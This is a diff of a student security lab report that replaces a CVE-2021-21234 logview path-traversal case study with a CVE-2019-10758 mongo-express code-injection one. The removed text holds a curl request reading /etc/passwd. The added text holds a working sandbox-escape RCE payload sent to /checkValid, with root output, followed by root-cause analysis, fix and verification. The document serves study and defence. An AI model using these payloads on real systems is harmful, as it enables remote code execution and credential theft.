@@ -1,4 +1,4 @@
-# Secure REST API · CI/CD Security Pipeline · CVE-2021-21234 Analysis
+# Secure REST API · CI/CD Security Pipeline · CVE-2019-10758 Analysis
 
 **HDU IS — Laboratory work No. 1**
 *Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis*
@@ -31,7 +31,7 @@ design (OWASP Top 10) → implement → test → SAST/SCA in CI → reproduce CV
 | CI/CD | GitHub Actions | Public pipeline runs, artefacts, job summary |
 | SAST | **bandit** | Detects hard-coded secrets, unsafe calls, weak crypto |
 | SCA | **pip-audit** | Matches dependencies against the PyPI advisory database |
-| Vulnerable target | **Spring Boot 1.5.22 + spring-boot-actuator-logview 0.2.12** | CVE-2021-21234, path traversal in the logview actuator endpoint |
+| Vulnerable target | **mongo-express 0.53.0** (Vulhub) | CVE-2019-10758, code injection in the `/checkValid` endpoint |
 
 ---
 
@@ -53,13 +53,10 @@ design (OWASP Top 10) → implement → test → SAST/SCA in CI → reproduce CV
 │   ├── demo_api.sh          # end-to-end curl demonstration
 │   └── ci_summary.py        # renders the pipeline summary
 ├── .github/workflows/ci.yml # SAST + SCA + tests on every push and pull request
-├── cve/spring-CVE-2021-21234/
-│   ├── pom.xml                     # Maven project, logview.version = 0.2.12 (vulnerable)
-│   ├── Dockerfile                  # Java 8 runtime image
-│   ├── docker-compose.yml          # vulnerable: logview 0.2.12
-│   ├── docker-compose.fixed.yml    # patched:    logview 0.2.13
-│   ├── src/                        # minimal Spring Boot 1.5 application
-│   ├── reproduce.sh                # exploit: read /etc/passwd, /etc/shadow, environ
+├── cve/mongo-express-CVE-2019-10758/
+│   ├── docker-compose.yml          # vulnerable: vulhub/mongo-express:0.53.0 + mongo:3.4
+│   ├── docker-compose.fixed.yml    # patched:    mongo-express:0.54.0
+│   ├── reproduce.sh                # exploit: one POST executes a shell command
 │   └── verify_fix.sh               # attack replay + regression check
 ├── evidence/                # raw terminal transcripts of every demonstration
 ├── docs/screenshots/        # rendered screenshots used in the report
@@ -243,138 +240,108 @@ were upgraded (Flask 3.0.3 → 3.1.3, PyJWT 2.10.1 → 2.15.1) and one dependenc
 
 ---
 
-## 8. CVE analysis — CVE-2021-21234 (spring-boot-actuator-logview path traversal)
+## 8. CVE analysis — CVE-2019-10758 (mongo-express code injection)
 
 | Field | Value |
 |---|---|
-| CVE | **CVE-2021-21234** |
-| Product | `eu.hinsch:spring-boot-actuator-logview` < 0.2.13 (fixed in 0.2.13) |
-| Class | CWE-22 Path Traversal → arbitrary file read (unauthenticated in this deployment) |
-| Impact | Confidentiality: any file readable by the application process — `/etc/passwd`, `/etc/shadow`, process environment, application configuration with credentials |
-| CVSS v3.1 | 7.7 High (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`) |
-| Environment | Custom Spring Boot 1.5.22 demo application; library 0.2.12 (vulnerable) vs 0.2.13 (patched); Java 8; Docker Compose; host port 8081 |
-
-Vulhub has no ready-made scenario for this CVE, so the environment was built from the
-vulnerable library itself: a minimal Spring Boot 1.5 application that exposes the
-`/log` actuator endpoint with `logging.path=/var/log/app`, packaged with
-`spring-boot-actuator-logview:0.2.12`.
+| CVE | **CVE-2019-10758** |
+| Product | mongo-express < 0.54.0 |
+| Class | Code injection (CWE-94/95): request data is passed to `eval()` inside a `vm` sandbox |
+| Impact | Remote code execution as the container user (root in this image), without credentials in this build |
+| CVSS v3.1 | 9.9 Critical (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`) |
+| Environment | Vulhub `mongo-express/CVE-2019-10758`; images `vulhub/mongo-express:0.53.0` + `mongo:3.4`; host port 8081 |
 
 ### 8.1 Vulnerable environment
 
 ```bash
-cd cve/spring-CVE-2021-21234
-mvn -B package -DskipTests                 # builds the fat jar with logview 0.2.12
-docker compose build && docker compose up -d
-docker compose ps                          # lab1-logview-vuln, 8081->8080
+docker compose up -d          # cve/mongo-express-CVE-2019-10758/docker-compose.yml
+docker compose ps             # web (0.53.0) + mongo 3.4, 8081->8081
 ```
+
+The web interface answers on <http://127.0.0.1:8081>. This build ships without
+basic authentication, so the vulnerable endpoint is reachable anonymously.
 
 ### 8.2 Reproduction
 
-The endpoint exposes two request parameters: `filename` (which file to show) and `base`
-(which sub-directory of the log root to browse). Supplying a traversal sequence in
-`base` escapes the log directory. `curl --path-as-is` keeps the sequence intact on the
-client side.
+`/checkValid` accepts a free-form document string and passes it to `toBSON()`.
+Supplying a JavaScript expression instead of JSON executes it:
 
 ```bash
-curl -s -i --path-as-is \
-  "http://127.0.0.1:8081/log/view?filename=passwd&base=../../../../etc"
+curl -s -i -X POST http://127.0.0.1:8081/checkValid \
+  --data-urlencode 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id > /tmp/pwned.txt")'
 ```
 
-**Result — `HTTP/1.1 200`, the file content is returned:**
+The response is `HTTP 200` with the body `Valid`, and the command has run:
 
 ```
-HTTP/1.1 200
-Content-Type: text/plain
-Content-Length: 888
-
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-...
+docker exec lab1-mongoexpress-vuln cat /tmp/pwned.txt
+uid=0(root) gid=0(root) groups=0(root)
 ```
-
-`filename` itself is clean (`passwd`), which is exactly why the library's own `..` check
-does not fire. The same request shape reads `/etc/shadow` and the process environment
-(`filename=environ&base=../../../../proc/self`), and `GET /log/` still lists the log
-directory normally — the endpoint works as designed, just not within its intended
-boundary.
 
 ![CVE reproduction](docs/screenshots/05-cve-repro.png)
 
 ### 8.3 Root cause
 
-The vulnerable version (`lib/.../LogViewEndpoint.java`, 0.2.12) validates only one of the
-two path parameters:
+`lib/bson.js` in 0.53.0 turns the request body into code:
 
-```java
-@RequestMapping("/view")
-public void view(@RequestParam String filename,
-                 @RequestParam(required = false) String base, ...) {
-    securityCheck(filename);                  // checks `filename` only
-    Path path = loggingPath(base);            // `base` never validated
-    ...
-    fileProvider.streamContent(path, filename, response.getOutputStream());
-}
-
-private Path loggingPath(String base) {
-    return base != null ? Paths.get(loggingPath, base) : Paths.get(loggingPath);
-}
-
-private void securityCheck(String filename) {
-    Assert.doesNotContain(filename, "..");    // string-level check
-}
+```js
+//JSON.parse doesn't support BSON data types
+//Document is evaluated in a vm in order to support BSON data types
+exports.toBSON = function (string) {
+  var sandbox = exports.getSandbox();
+  string = string.replace(/ISODate\(/g, 'new ISODate(');
+  string = string.replace(/Binary\\(("[^"]+"),/g, 'Binary(new Buffer($1, "base64"),');
+  vm.runInNewContext('doc = eval((' + string + '));', sandbox);
+  return sandbox.doc;
+};
 ```
 
-`Paths.get("/var/log/app", "../../../../etc")` resolves to `/etc`, and `filename=passwd`
-is then appended to it, so the file is opened outside the root. The check is applied to
-**the wrong parameter** and at **the wrong level**: it inspects one string for `..`
-instead of inspecting the resolved path for containment.
+Two things are wrong, and both are the same mistake in different clothes:
 
-This is an input-handling error, not a configuration error and not a missing
-authentication check — the endpoint is supposed to serve logs, and in this lab it is
-exposed without authentication to model an actuator endpoint reachable by a low-privileged
-user (NVD scores the vulnerability `PR:L` for exactly that reason). The defect is the
-absence of a "does the resolved file still live inside the log root?" test.
+1. **The input is concatenated into `eval()`.** Whatever the user sends is
+   parsed as *source code*, not as *data*. This is the code-injection analogue
+   of string-concatenated SQL.
+2. **`vm` is not a security boundary.** Node's documentation says so
+   explicitly. A payload such as
+   `this.constructor.constructor('return process')()` walks out of the sandbox
+   and reaches `process.mainModule.require('child_process')`, which is exactly
+   what the PoC does.
+
+The NVD description puts it the same way: "a misuse of the `vm` dependency to
+perform `exec` commands in a non-safe environment".
 
 ### 8.4 Fix
 
-Applied fix — upgrade the library and rebuild, keeping the application source untouched:
+The fix is a version upgrade, and it replaces the evaluator with a parser:
 
-```xml
-<!-- pom.xml -->
-<properties>
-  <logview.version>0.2.13</logview.version>   <!-- was 0.2.12 -->
-</properties>
+```js
+// 0.54.0 — lib/bson.js
+const parser = require('mongodb-query-parser');
+
+exports.toBSON = function (string) {
+  return parser(string);
+};
 ```
 
-```bash
-mvn -B package -DskipTests -Dlogview.version=0.2.13
-docker compose -f docker-compose.fixed.yml build
-docker compose -f docker-compose.fixed.yml up -d
+```yaml
+# cve/mongo-express-CVE-2019-10758/docker-compose.fixed.yml
+services:
+  web:
+    image: mongo-express:0.54.0      # was vulhub/mongo-express:0.53.0
+    environment:
+      ME_CONFIG_BASICAUTH: "false"   # same setting as the vulnerable build
 ```
 
-What the vendor changed in 0.2.13 is precisely the missing check — it now validates the
-resolved canonical path against the canonical log root:
+Why it is effective: a **parser** consumes its input as data and has no
+interpreter to escape from; `vm.runInNewContext` plus `eval` is a **runtime**
+that will happily run anything. The vulnerability is not fixed by adding a
+filter to the string — it is fixed by removing the code path that could execute
+it. That is also why the fix had to come from the vendor: the `eval` lives in
+the library, not in my application.
 
-```java
-private void securityCheck(Path base, String filename) {
-    String canonicalLoggingPath = new File(base.toFile(), filename).getCanonicalPath();
-    String baseCanonicalPath = new File(loggingPath).getCanonicalPath();
-    Assert.isTrue(canonicalLoggingPath.startsWith(baseCanonicalPath),
-        "File ... may not be located outside base path " + loggingPath);
-}
-```
-
-Why it is effective: `getCanonicalPath()` resolves every `.` and `..` and returns an
-absolute path, so the comparison happens on the **final target**, not on the raw
-parameters. Any resolution that lands outside `/var/log/app` fails the `startsWith`
-test, no matter which parameter carried the traversal. Because the check is on the
-resolved path, it also covers encodings and multi-segment tricks that a string search
-for `..` would miss.
-
-If upgrading were impossible, the compensating controls are: restrict the filesystem
-permissions of the account running the application, and block `..`/`%2e%2e` sequences on
-the actuator path at the reverse proxy.
+Both environments are deliberately configured the same way (basic auth off), so
+the only difference between the vulnerable and the fixed deployment is the
+software version.
 
 ### 8.5 Verification of the fix
 
@@ -386,31 +353,20 @@ docker compose -f docker-compose.fixed.yml up -d
 
 ```
 === attack replay against the patched container ===
-  /etc/passwd                -> HTTP 500   leaked_root_lines=0
-  /etc/shadow                -> HTTP 500   leaked_root_lines=0
-  /proc/self/environ         -> HTTP 500   leaked_root_lines=0
+  POST /checkValid               -> HTTP 200   command_executed=no
+  body                           -> response: Invalid
 
 === regression: legitimate functionality still works ===
-  GET /log/ (listing)        -> HTTP 200
-  GET /log/view?spring.log   -> HTTP 200
-  GET /log/search?term=INFO  -> HTTP 200
-```
-
-The patched container answers with the library's own rejection message instead of file
-content:
-
-```json
-{"status":500,"error":"Internal Server Error",
- "message":"File /var/log/app/../../../../etc/passwd may not be located outside base path /var/log/app"}
+  GET / (web interface)          -> HTTP 200
+  POST /checkValid {document:{}} -> HTTP 200 (Valid)
 ```
 
 ![Fix verification](docs/screenshots/06-cve-fixed.png)
 
-The exploit is dead — no file content is returned for any of the three targets — while the
-log listing, the single-file view and the search function still return `200`. The
-remaining observation is that 0.2.13 rejects with `500` (an `IllegalArgumentException`
-surfacing through the default error handler) rather than `400`; content-wise this is
-safe, but a reverse proxy mapping that case to `400` would be cleaner.
+Two details matter here. The endpoint still answers `200`, but the body changed
+from `Valid` to `Invalid` — the parser rejects the JavaScript expression instead
+of evaluating it. And a normal document (`{}`) is still accepted and still
+returns `Valid`, so the feature was not broken by the patch.
 
 ---
 
@@ -447,9 +403,8 @@ image can be checked against the corresponding `.log` file.
    path that your own code review never touches (Log4Shell being the canonical example).
 5. **Docker + Vulhub.** Reproducible, disposable, isolated: one command builds the exact
    vulnerable version, `down` erases it, and nothing vulnerable ever runs on the host.
-   Vulhub had no scenario for CVE-2021-21234, so here the vulnerable image is built from
-   the affected library pinned in a `pom.xml` and `Dockerfile` — the same principle, the
-   bad version lives in a container definition instead of on the machine.
+   This scenario comes straight from Vulhub, so the vulnerable and patched deployments
+   differ only in the image tag.
 6. **Vulnerability vs exploit.** A vulnerability is the flaw; an exploit is the concrete
    input/sequence that abuses it. This work reproduced the exploit and then removed the
    flaw.
